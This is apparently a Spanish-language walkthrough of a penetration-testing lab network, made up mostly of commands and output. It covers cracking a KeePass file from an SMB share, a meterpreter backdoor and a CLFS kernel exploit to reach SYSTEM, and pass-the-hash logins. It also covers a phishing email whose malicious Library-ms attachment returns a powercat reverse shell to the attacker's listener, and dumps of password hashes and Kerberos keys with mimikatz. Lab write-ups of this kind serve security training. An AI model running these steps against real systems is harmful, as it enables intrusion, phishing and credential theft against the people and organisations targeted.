/ADMIN                (Status: 301) [Size: 167] [--> http://192.168.231.248/DesktopModules/ADMIN/]
/journal              (Status: 301) [Size: 169] [--> http://192.168.231.248/DesktopModules/journal/]
/RSS.aspx             (Status: 200) [Size: 57]
/HTML                 (Status: 301) [Size: 166] [--> http://192.168.231.248/DesktopModules/HTML/]
/SiteMap.aspx         (Status: 200) [Size: 663]
/Sitemap.aspx         (Status: 200) [Size: 663]
/Html                 (Status: 301) [Size: 166] [--> http://192.168.231.248/DesktopModules/Html/]
/LinkClick.aspx       (Status: 302) [Size: 165] [--> http://192.168.231.248/404-Error-Page/status/404]
/connectors           (Status: 301) [Size: 172] [--> http://192.168.231.248/DesktopModules/connectors/]
/Rss.aspx             (Status: 200) [Size: 57]
/Logoff.aspx          (Status: 302) [Size: 155] [--> http://192.168.231.248/Home/ctl/LogOff]
/Journal              (Status: 301) [Size: 169] [--> http://192.168.231.248/DesktopModules/Journal/]
/.captcha.aspx        (Status: 200) [Size: 0]
Progress: 65965 / 215040 (30.68%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 65965 / 215040 (30.68%)
===============================================================
Finished
===============================================================
```

> Para el exploit de **MSF** Necesitamos la version exacta de **dnn**

Luego de unos intentos interesantes con **MSF** no obtenemos resultados.

#### Volvemos al formulario de login que encontramos en la pagina.
1. Credenciales por defecto:
```bash
For the Host (Superuser) Account:
Username: host
Password: dnnhost

For the Admin Account
Username: admin
Password: dnnadmin
```
Intentamos passwords comunes y damos con:
* User:admin
* Password: password

Intgresamos en el panel _Settings>SQL Console_ y podemos ejecutar comandos SQL. 

```SQL
SELECT @@VERSION;

Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) Sep 24 2019 13:48:23 Copyright (C) 2019 Microsoft Corporation Express Edition (64-bit) on Windows Server 2022 Standard 10.0 <X64> (Build 20348: ) (Hypervisor) 

SELECT @@SERVERNAME;

WIN-PIFPPLOIHAP\SQLEXPRESS
```

#### Posible vector de ataque: 

> Corromper la base de datos.

1. Confirmamos nuestros permisos/privilegios etc.. 

- Enumerando vemos lo siguiente: `SELECT * FROM Users;`

|UserID	| Username | FirstName| LastName |IsSuperUser |AffiliateId |Email |DisplayName |UpdatePassword |LastIPAddress |IsDeleted | CreatedByUserID |CreatedOnDate |LastModifiedByUserID	| LastModifiedOnDate| PasswordResetToken | PasswordResetExpiration |
|-------|----------|----------|----------|------------|------------|-----|-------------|---------------|--------------|----------|-----------------|--------------|---------------------|-------------------|-------------------|-------------------------|
|1	|admin	   |SuperUser |Account   |true	      |emma@relia.com	|SuperUser |Account	false	|192.168.45.213|false|	-1	|2022-10-13T04:21:33.727	|-1|2025-06-16T05:55:32.993 | c994ba72-f11f-496a-a197-1d5fe97ff18c| 2022-10-14T04:21:33.54|

2. Enmeramos las tablas mas interesantes:
```bash
SELECT * FROM dnndatabase.dbo.PasswordHistory;
```
|PasswordHistoryID	|UserID	|Password	|PasswordSalt	|CreatedByUserID	|CreatedOnDate	|LastModifiedByUserID	|LastModifiedOnDate|
|-------|-------|-------------------------------|-------------------------------|-------|-------------------------------|-------|-----------------------|
|1	|1	|GXbn3lxsWWtBO2MpUnKsKsKlRIk=	|IBbnchM9THHT+yekj4AAwg==	|1	|2022-10-13T04:21:33.747	|1	|2022-10-13T04:21:33.747|

> Sin embargo parece que las credenciales de emma no estan en esta basededatos

#### Muchos doritos despues de exploracion pasamos al servicio **SMB**

1. 

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/248-machine]
‚îî‚îÄ# smbclient -L //192.168.161.248 -N


        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        transfer        Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.161.248 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/248-machine]
‚îî‚îÄ# smbclient //192.168.161.248/transfer -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Oct 13 14:19:09 2022
  ..                                DHS        0  Tue Jun 17 17:44:26 2025
  DB-back                             D        0  Thu Oct 13 14:19:08 2022
  DB-back (1)                         D        0  Thu Oct 13 14:19:09 2022
  ee18                                D        0  Thu Oct 13 14:19:08 2022
  logs                                D        0  Thu Oct 13 14:19:08 2022
  r14_2022                            D        0  Thu Oct 13 14:19:08 2022
  rx1                                 D        0  Thu Oct 13 14:19:08 2022
  rx2                                 D        0  Thu Oct 13 14:19:08 2022
  rx3                                 D        0  Thu Oct 13 14:19:08 2022
  rx4                                 D        0  Thu Oct 13 14:19:08 2022
  rx5                                 D        0  Thu Oct 13 14:19:08 2022
  rx6                                 D        0  Thu Oct 13 14:19:08 2022
  rx8                                 D        0  Thu Oct 13 14:19:08 2022

smb: \> cd "DB-back (1)"
smb: \DB-back (1)\> ls
  .                                   D        0  Thu Oct 13 14:19:09 2022
  ..                                  D        0  Tue Jun 17 18:18:11 2025
  New Folder                          D        0  Thu Oct 13 14:19:09 2022

                5864959 blocks of size 4096. 1962295 blocks available
smb: \DB-back (1)\> cd "New Folder"
smb: \DB-back (1)\New Folder\> ls
  .                                   D        0  Thu Oct 13 14:19:09 2022
  ..                                  D        0  Thu Oct 13 14:19:09 2022
  Emma                                D        0  Thu Oct 13 14:19:09 2022

                5864959 blocks of size 4096. 1962295 blocks available
smb: \DB-back (1)\New Folder\> cd Emma
smb: \DB-back (1)\New Folder\Emma\> ls
  .                                   D        0  Thu Oct 13 14:19:09 2022
  ..                                  D        0  Thu Oct 13 14:19:09 2022
  Documents                           D        0  Fri Oct 21 05:47:41 2022

                5864959 blocks of size 4096. 1962292 blocks available
smb: \DB-back (1)\New Folder\Emma\> cd Documents
smb: \DB-back (1)\New Folder\Emma\Documents\> ls
  .                                   D        0  Fri Oct 21 05:47:41 2022
  ..                                  D        0  Thu Oct 13 14:19:09 2022
  Database.kdbx                       A     2990  Fri Oct 21 05:47:41 2022

                5864959 blocks of size 4096. 1962292 blocks available
smb: \DB-back (1)\New Folder\Emma\Documents\> get Database.kdbx
getting file \DB-back (1)\New Folder\Emma\Documents\Database.kdbx of size 2990 as Database.kdbx (3.8 KiloBytes/sec) (average 1.3 KiloBytes/sec)
smb: \DB-back (1)\New Folder\Emma\Documents\> 

```

* Obtenemos el archivo y lo preparamos para obtener manipularlo y obtener su contenido:

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/248-machine]
‚îî‚îÄ# keepass2john Database.kdbx > hash.kdbx
                                                                                                       
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/248-machine]
‚îî‚îÄ# john hash.kdbx --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
welcome1         (Database)     
1g 0:00:00:24 DONE (2025-06-17 18:41) 0.04040g/s 71.11p/s 71.11c/s 71.11C/s 2hot4u..welcome1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

- Procesamos con keepassxc:

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/248-machine]
‚îî‚îÄ# keepassxc Database.kdbx 
QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'
# ingresamos el password: welcome1
```
- Obtenemos Credenciales:
|Username | Password |
|---------|----------|
bo|Luigi=Papal1963
emma| SomersetVinyl1!
Michael321|12345
sa| SAPassword_1998
old | HabitsAgesEnd123
User Name | Password

#### Obtenemos el primer flag local.txt de EXTERNAL:
```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/248-machine]
‚îî‚îÄ# impacket-smbclient emma:'SomersetVinyl1!'@192.168.161.248                      
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
IPC$
transfer
Users
# use Users
# ls
drw-rw-rw-          0  Thu Oct 20 09:38:37 2022 .
drw-rw-rw-          0  Tue Jun 17 17:44:26 2025 ..
drw-rw-rw-          0  Thu Oct 13 13:59:24 2022 Default
-rw-rw-rw-        174  Thu Oct 13 14:54:34 2022 desktop.ini
drw-rw-rw-          0  Thu Oct 20 08:12:43 2022 emma
drw-rw-rw-          0  Fri Oct 14 17:34:25 2022 Public
# cd emma
# ls
drw-rw-rw-          0  Thu Oct 20 08:12:43 2022 .
drw-rw-rw-          0  Thu Oct 20 09:38:37 2022 ..
drw-rw-rw-          0  Thu Oct 20 08:12:43 2022 3D Objects
drw-rw-rw-          0  Thu Oct 20 08:12:37 2022 AppData
drw-rw-rw-          0  Thu Oct 20 08:12:43 2022 Contacts
drw-rw-rw-          0  Tue Jun 17 17:45:22 2025 Desktop
drw-rw-rw-          0  Thu Oct 20 08:12:44 2022 Documents
drw-rw-rw-          0  Thu Oct 20 08:12:44 2022 Downloads
drw-rw-rw-          0  Thu Oct 20 08:12:48 2022 Favorites
drw-rw-rw-          0  Thu Oct 20 08:12:44 2022 Links
drw-rw-rw-          0  Thu Oct 20 08:12:44 2022 Music
-rw-rw-rw-     786432  Thu Oct 20 08:12:37 2022 NTUSER.DAT
-rw-rw-rw-      65536  Thu Oct 20 08:12:37 2022 ntuser.dat.LOG1
-rw-rw-rw-          0  Thu Oct 20 08:12:37 2022 ntuser.dat.LOG2
-rw-rw-rw-      65536  Thu Oct 20 09:26:48 2022 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Thu Oct 20 08:12:37 2022 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Thu Oct 20 08:12:37 2022 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Thu Oct 20 09:30:03 2022 ntuser.ini
drw-rw-rw-          0  Thu Oct 20 08:12:44 2022 Pictures
drw-rw-rw-          0  Thu Oct 20 08:12:44 2022 Saved Games
drw-rw-rw-          0  Thu Oct 20 08:12:44 2022 Searches
drw-rw-rw-          0  Thu Oct 20 08:12:43 2022 Videos
# cd Desktop
# ls
drw-rw-rw-          0  Tue Jun 17 17:45:22 2025 .
drw-rw-rw-          0  Thu Oct 20 08:12:43 2022 ..
-rw-rw-rw-        282  Thu Oct 20 08:12:43 2022 desktop.ini
-rw-rw-rw-         34  Tue Jun 17 17:45:22 2025 local.txt
# cat local.txt
e2818bfe33eba3f32cca5c35abb2ca9b

# 
```
#### Nos conectamos por RDP

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/248-machine]
‚îî‚îÄ# xfreerdp /u:"emma" /p:'SomersetVinyl1!' /v:192.168.230.248 /dynamic-resolution +clipboard /cert:ignore
[15:52:56:550] [4711:4713] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: America/Argentina/Buenos_Aires
[15:52:57:151] [4711:4713] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[15:52:57:152] [4711:4713] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[15:52:57:218] [4711:4713] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[15:52:57:218] [4711:4713] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[15:52:57:218] [4711:4713] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
[15:52:58:962] [4711:4713] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
```
> Subimos un backdoor generado con msfvenom y levantamos una session meterpreter

#### MSF

```bash
msf6 post(multi/recon/local_exploit_suggester) > run
[*] 192.168.230.248 - Collecting local exploits for x64/windows...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 192.168.230.248 - 203 exploit checks are being tried...
[+] 192.168.230.248 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 192.168.230.248 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 192.168.230.248 - exploit/windows/local/cve_2021_40449: The target appears to be vulnerable. Vulnerable Windows Server 2022 build detected!
[+] 192.168.230.248 - exploit/windows/local/cve_2022_21882_win32k: The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022
[+] 192.168.230.248 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
[+] 192.168.230.248 - exploit/windows/local/cve_2023_28252_clfs_driver: The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
[+] 192.168.230.248 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 169
[+] 192.168.230.248 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022
[+] 192.168.230.248 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[*] Running check method for exploit 48 / 48
[*] 192.168.230.248 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2021_40449                           Yes                      The target appears to be vulnerable. Vulnerable Windows Server 2022 build detected!
 4   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022
 5   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
 7   exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 169
 8   exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022
 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.

msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/cve_2023_28252_clfs_driver
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set LHOST 192.168.45.213
LHOST => 192.168.45.213
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > run 
[*] Started reverse TCP handler on 192.168.45.213:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
[*] Launching netsh to host the DLL...
[+] Process 5972 launched.
[*] Reflectively injecting the DLL into 5972...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (203846 bytes) to 192.168.230.248
[*] Meterpreter session 2 opened (192.168.45.213:4444 -> 192.168.230.248:63498) at 2025-07-10 19:02:38 -0300

meterpreter > shell
Process 4792 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Users\emma>whoami
whoami
nt authority\system

C:\Users\emma>
```
#### Obtenemos el flag:

```powershell
C:\Users\Administrator\Desktop>powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\Administrator\Desktop> Get-ChildItem -Path C:\Users -Include *.txt -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Include *.txt -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\emma\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/10/2025  11:38 AM             34 local.txt                                                            


    Directory: C:\Users\mark\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/10/2025  11:38 AM             34 proof.txt                                                            


PS C:\Users\mark\Desktop> type proof.txt
type proof.txt
5925cfd1783c9a77d3261f4eaa663785
PS C:\Users\mark\Desktop>
```

## LOGIN

> HTTP Basic Authentication

* Header:

```bash
GET / HTTP/1.1
Host: 192.168.230.191
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YWRtaW4= #Parametros en base64 por header ej admin:admin
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
* Ataque diccionario inicial

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/191-machine]
‚îî‚îÄ# hydra -L /usr/share/seclists/Usernames/sap-default-usernames.txt -P /usr/share/wordlists/rockyou.txt 192.168.230.191 http-get /
```

> Luego de intentar con todas las credenciales, no tenemos exito. Buscamos alternativas volviendo a maquinas obtenidas para revisar archivos que puedan tener informacion valiosa.

* Encontramos en **LEGACY** un directorio .git que puede tener informacion extra.

```powershell
# Con las credenciales Administrator:
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/249-machine]
‚îî‚îÄ# evil-winrm -i 192.168.217.249 -u 'Administrator' -H 387aef0561b65e4f3cae0960b0fba2d5 -P 5985
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd C:\staging
*Evil-WinRM* PS C:\staging> git status
git.exe : fatal: detected dubious ownership in repository at 'C:/staging'
    + CategoryInfo          : NotSpecified: (fatal: detected...at 'C:/staging':String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
'C:/staging/.git' is owned by:  'S-1-5-21-464543310-226837244-3834982083-1003'but the current user is:  'S-1-5-21-464543310-226837244-3834982083-500'To add an exception for this directory, call:      git config*Evil-WinRM* PS C:\staging> 
```
* El mensaje es bastante claro, entramos con el usuario con ese **RID**

```powershell
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/‚Ä¶/OffSec/Challenges/2_Relia/249-machine]
‚îî‚îÄ# evil-winrm -i 192.168.217.249 -u 'damon' -H 820d6348890893116880101307197052 -P 5985        
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\damon\Documents> cd C:\staging
*Evil-WinRM* PS C:\staging> git show
commit 8b430c17c16e6c0515e49c4eafdd129f719fde74
Author: damian <damian>
Date:   Thu Oct 20 02:07:42 2022 -0700

    Email config not required anymore

diff --git a/htdocs/cms/data/email.conf.bak b/htdocs/cms/data/email.conf.bak
deleted file mode 100644
index 77e370c..0000000
--- a/htdocs/cms/data/email.conf.bak
+++ /dev/null
@@ -1,5 +0,0 @@
-Email configuration of the CMS
-maildmz@relia.com:DPuBT9tGCBrTbR
-
-If something breaks contact jim@relia.com as he is responsible for the mail server.
-Please don't send any office or executable attachments as they get filtered out for security reasons.
\ No newline at end of file
*Evil-WinRM* PS C:\staging> 
```

> Intentamos un phishing sobre al usuario jim.

1. **WEBDAV** 

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WINPREP]
‚îî‚îÄ# wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/OffSec/27-Assembling-The-Pieces/WINPREP
```
2. **Server python**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/OffSec/27-Assembling-The-Pieces]
‚îî‚îÄ$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.142.191 - - [12/Jul/2025 12:51:16] "GET /powercat.ps1 HTTP/1.1" 200 -
```
3. **Mail**

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/27-Assembling-The-Pieces/WINPREP]
‚îî‚îÄ# swaks -t jim@relia.com --from damon@relia.com --attach @config.Library-ms --server 192.168.142.189 --body @mail_to_jim.txt --header "Subject: Notifications settings change" --suppress-data -ap
Username: maildmz
Password: DPuBT9tGCBrTbR
=== Trying 192.168.142.189:25...
=== Connected to 192.168.142.189.
<-  220 MAIL ESMTP
 -> EHLO localhost
<-  250-MAIL
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> bWFpbGRteg==
<-  334 UGFzc3dvcmQ6
 -> RFB1QlQ5dEdDQnJUYlI=
<-  235 authenticated.
 -> MAIL FROM:<damon@relia.com>
<-  250 OK
 -> RCPT TO:<jim@relia.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> 49 lines sent
<-  250 Queued (7.797 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```

4. **Receptor**

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# nc -lvnp 4444                        
listening on [any] 4444 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.142.191] 63986
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami  
whoami
relia\jim
PS C:\Windows\System32\WindowsPowerShell\v1.0> 
```
#### Enumaramos el host WK01

* **Flag local**

```powershell
PS C:\Users\jim\Desktop> dir
dir


    Directory: C:\Users\jim\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/12/2025   8:09 AM             34 local.txt                                                            
-a----        10/19/2022   1:22 AM           1585 Thunderbird.lnk                                                      


PS C:\Users\jim\Desktop> type local.txt
type local.txt
78aa0e6cead90c8a1e2711df89796f01
PS C:\Users\jim\Desktop> 
```
#### Obtenemos el flag proof

> Configuramos el suggester con la session meterpreter del usuario jim. Utilizamos el exploit: **exploit/windows/local/cve_2023_28252_clfs_driver** y Obtenemos session meterpreter con privilegios elevados

```powershell
PS C:\Users\Administrator> Get-ChildItem -Path C:\Users -Include *.txt -Recurse -ErrorAction SilentlyContinue      
Get-ChildItem -Path C:\Users -Include *.txt -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\jim\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/12/2025   8:09 AM             34 local.txt                                                            


    Directory: C:\Users\offsec\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/12/2025   8:09 AM             34 proof.txt                                                            


    Directory: C:\Users\offsec\Documents


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          5/5/2019  11:00 AM           7490 Eula.txt                                                             

PS C:\Users\offsec\Desktop> type proof.txt
type proof.txt
5d6ab7d2f773c9b5fc5faa6c2c4459a9
```

#### Extraemos credenciales con mimikatz


```bash
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
offsec:1001:aad3b435b51404eeaad3b435b51404ee:a6e162b0429f0ff6cee42809a01fd49d:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:d8aa69abd669a0d0ffe02ae095a4e301:::

meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain  NTLM                              SHA1                                      DPAPI
--------  ------  ----                              ----                                      -----
WK01$     RELIA   b47d6cff1df8db23ea339d81ee762710  526022da1904296633d36d21cc5f8bb562382d06
WK01$     RELIA   aa704e701eb6532afc42350a19c329c5  e588c6de7035c11de7bb7b18120548cef7f8fabd
jim       RELIA   be5cb823ee026304b6ed0cd356e34a3c  eb7d6b7fd8e4cc83593fab114174f6426c990449  7aeef260c633a25ef3ed52d88e8c2545
offsec    WK01    a6e162b0429f0ff6cee42809a01fd49d  42cb8143432b29f858a6b399a3f9a9613430c91b

wdigest credentials
===================

Username  Domain  Password
--------  ------  --------
(null)    (null)  (null)
WK01$     RELIA   (null)
jim       RELIA   (null)
offsec    WK01    (null)

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
WK01$     relia.com  fd 3f 3e 3b c1 07 0a fa 5f cd 10 fe 0f 86 31 be 9e 09 3b 37 53 43 2c 1e 0c 6c 9d a8 80 1d cb 15 28 9e 1d 92 97 ee d0 09 b0 7a fc 3f d5 6a b4 9b b3 c4 b9 e6 66 2c 7a 3c 4d 68 6b 01 9e d8 c
                     d 81 39 be 66 30 fb ab 3f af ec f2 f9 29 86 e9 65 f4 59 8e 48 ca d5 59 4a c3 20 85 6e dc 3b de 8c 13 7c ee cf ef 23 ed 6f da a6 41 cf b2 af ac f6 9f c8 36 37 45 31 3c cd 53 ec 78 cd 02 f3
                      08 a0 ea 3c 4d f3 6e 73 f3 0d 21 b2 1d 44 8e 37 c0 94 01 81 07 cd 0b d1 25 cd dc 36 a6 02 97 3d 25 94 9b 8f 3f 1a e4 c5 fe 14 bc ae bd 14 c9 4a a7 8e 27 d1 c3 aa da e7 95 20 e7 bb 7c 2f
                     06 46 d1 a2 1b 11 fe 9f 9c ec df c5 52 2f b0 6c 04 aa e9 43 b8 fb 66 40 8f 10 a2 91 99 e9 3c 59 eb 43 18 80 55 6e 2c 70 4b 17 62 31 d4 72 d3 a6 77 59 d3 d6 6e
WK01$     relia.com  a0 49 48 83 13 d2 1e 64 86 f2 e2 b6 c7 b0 a5 2a 47 bb 4e d7 f8 59 51 c3 ed 43 b1 b0 10 f3 fb c2 74 1e c5 0a 00 31 7d eb 63 d3 22 0a 13 91 4a 69 1c 4b 7a 27 9c e4 e3 f7 35 71 3a 85 06 e6 7
                     9 c4 8d a3 4d 25 80 c8 8c f1 98 5f 50 ca e9 e0 70 d7 eb ec a6 fc 29 b8 05 94 15 f7 f8 36 e5 42 dc 4e 01 3b 79 a0 23 ff 50 e9 53 47 a1 d0 53 8e 0c 06 3e 76 03 d1 ae 37 ce 08 96 2b 80 cb f4
                      d5 cf bf 58 28 cc 99 23 db c6 36 ba 2e 04 7a 6b 02 7a a6 b8 b8 ca 79 04 e2 94 0c a3 3d 63 41 22 59 52 27 6e 0f f3 c7 52 01 3e 71 e0 71 e9 ec a6 e0 ce 19 67 12 2e 04 f5 d8 75 23 c5 8b 7e
                     ed 14 8c f3 eb db ff 3a 37 6d a6 a8 67 27 e9 f4 8e 4c 40 9b fa 6e b0 dc f6 e7 e5 3c 8e 0b 1a c0 3d ac a8 c0 a5 ad 4f b6 55 ed 9b 55 87 71 b3 ee 06 70 f0 3a c7
jim       RELIA.COM  (null)
offsec    WK01       (null)
